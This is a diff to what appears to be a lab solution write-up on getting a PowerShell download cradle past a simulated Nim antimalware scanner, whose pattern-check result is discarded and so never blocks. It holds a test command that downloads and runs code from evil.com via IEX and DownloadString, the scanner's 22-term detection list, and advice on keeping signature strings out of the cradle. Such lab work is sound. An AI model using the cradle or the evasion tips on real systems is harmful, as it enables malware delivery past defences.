@@ -12,7 +12,7 @@ permalink: /solutions/14-download-cradle/
 
 ## Overview
 
-Exploit a critical design flaw in the scanner: the suspicious pattern detection logic uses `discard` for its result, meaning it identifies threats but **never blocks them**. Standard download cradles work because even if the scanner recognizes the pattern, it takes no action to prevent execution.
+Exploit a critical design flaw in the scanner: the suspicious pattern check (`suspiciousPatternCheck`) correctly identifies download cradle patterns and returns `false` — but the scan pipeline calls it with `discard`, meaning the return value is immediately thrown away. The file passes regardless of what the check finds.
 
 ## Working Code
 
@@ -70,33 +70,54 @@ IEX $data
 
 ## Why It Works
 
-Looking at the scanner source code (`nim_antimalware_sim.nim`), the suspicious pattern check has a critical flaw:
+Looking at the actual scanner source (`nim_antimalware_sim.nim`), the suspicious pattern
+check is implemented in two parts. First, a `containsSuspiciousPatterns` helper that
+returns a `(bool, string)` tuple, and a `suspiciousPatternCheck` proc on the `ScanEngine`
+that calls it and returns `false` when a pattern is found:
 
 ```nim
-proc checkSuspiciousPatterns(content: string): string =
-  # ... pattern matching logic ...
-  if hasDownloadCradle and hasExecution:
-    discard "suspicious"  # <-- BUG: result is discarded!
-  # ...
+# All 22 patterns the scanner recognises (from nim_antimalware_sim.nim):
+const suspiciousPatterns = [
+  "invoke-expression", "iex(",           "iex ",             "downloadstring",
+  "downloadfile",      "webclient",       "bitstransfer",     "start-process",
+  "invoke-webrequest", "net.webclient",   "reflection.assembly",
+  "frombase64string",  "encodedcommand",  "bypass",           "hidden",
+  "-nop",              "-noni",           "amsiutils",        "amsiinitfailed",
+  "virtualallocex",    "writeprocessmemory", "createremotethread", "shellcode"
+]
+
+proc suspiciousPatternCheck(self: ScanEngine): bool =
+  log("AMSI: Checking for suspicious script patterns...")
+  let (found, pattern) = containsSuspiciousPatterns(self.content)
+  if found:
+    log("AMSI: \e[33mWarning - Suspicious pattern detected: " & pattern & "\e[0m")
+    return false   # signals detection...
+  return true
+
+# In the scan pipeline — the BUG is here, NOT inside the proc:
+discard engine.suspiciousPatternCheck()  # <-- return value thrown away, never blocks
 ```
 
-The `discard` keyword in Nim explicitly throws away the value. This means:
+The `discard` keyword at the call site is what breaks enforcement. The detection
+function itself works correctly — it finds the pattern and returns `false`. But
+the pipeline ignores that result and continues to the next check, ultimately
+returning `true` (clean) to the caller.
 
-1. The scanner **does** detect the download cradle pattern
-2. It **does** identify it as suspicious
-3. But the detection result is **discarded** - never returned, never acted upon
-4. The function effectively returns nothing useful
-5. No blocking, no alerting, no quarantine occurs
-
-This is a **design flaw**, not a bypass technique. The scanner was written to identify suspicious patterns but the developer accidentally (or intentionally for this exercise) discarded the result instead of returning it or triggering an action.
+This is different from discarding a string literal inside the proc (which would
+be a Nim compiler warning); here `discard` is intentional and silences a
+meaningful boolean return value.
 
 ### What the Scanner Checks For
 
-The scanner looks for combinations of:
-- Download indicators: `WebClient`, `DownloadString`, `Invoke-WebRequest`, `Net.Http`
-- Execution indicators: `IEX`, `Invoke-Expression`, `& `, `Start-Process`
+The 22-pattern list covers download cradles (`webclient`, `downloadstring`,
+`invoke-webrequest`, `bitstransfer`), execution primitives (`iex`, `invoke-expression`,
+`start-process`), .NET reflection (`reflection.assembly`, `frombase64string`),
+common PowerShell evasion flags (`-nop`, `-noni`, `bypass`, `hidden`,
+`encodedcommand`), AMSI internals (`amsiutils`, `amsiinitfailed`), and memory
+injection indicators (`virtualallocex`, `writeprocessmemory`, `createremotethread`,
+`shellcode`).
 
-It correctly identifies these patterns but fails to act on them.
+**All of these generate a warning log line — none of them block the file.**
 
 ## How to Verify
 
@@ -114,27 +135,32 @@ It correctly identifies these patterns but fails to act on them.
    nim_antimalware_sim.exe test_cradle.ps1
    ```
 
-3. Expected result: **No blocking occurs** - the scanner may log/identify the pattern but takes no enforcement action due to the `discard` bug.
+3. Expected result: **No blocking** — the scanner logs a warning for `webclient`
+   and `iex` but returns BENIGN because the `suspiciousPatternCheck` result is
+   discarded.
 
-4. Verify that signature detection still works independently:
+4. Verify that signature detection still blocks independently:
    ```powershell
-   # This WILL be detected (contains "malware" literal)
+   # This WILL be detected (contains the literal "malware" signature)
    Set-Content "test_sig.ps1" -Value '$x = "malware"'
    nim_antimalware_sim.exe test_sig.ps1
-   # Detected!
+   # → MALICIOUS
 
-   # This will NOT be blocked (download cradle without signatures)
+   # This will NOT be blocked (download cradle, no signature strings)
    Set-Content "test_cradle2.ps1" -Value '$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString("http://evil.com/x")'
    nim_antimalware_sim.exe test_cradle2.ps1
-   # Not blocked due to discard bug
+   # → BENIGN (discard bug)
    ```
 
-5. The key insight: avoid putting actual signature strings ("malware", "virus", etc.) in the cradle script. The download cradle itself is safe; only literal signatures in the file trigger real detection.
+5. The key insight: keep literal signature strings (`malware`, `virus`, etc.) out
+   of the cradle. The cradle patterns themselves never block.
 
 ## Security Implications
 
-This demonstrates why defense-in-depth matters:
-- A scanner that detects but doesn't block is equivalent to no scanner
-- Real AV products use multiple layers: static signatures, heuristics, behavioral analysis, sandboxing
-- A single `discard` bug negates entire detection capabilities
-- Download cradles are one of the most common initial access techniques because they separate the indicator (the cradle) from the payload (downloaded content)
+This demonstrates why detection-without-enforcement is equivalent to no detection:
+- A scanner that warns but never blocks is transparent to an attacker
+- Real AV products combine static signatures, heuristics, behavioural analysis, and sandboxing
+- A single `discard` at the call site negates all pattern-matching work
+- Download cradles are one of the most common initial-access techniques because
+  they separate the detectable indicator (the cradle script on disk) from the
+  payload (downloaded into memory at runtime, never touching disk)
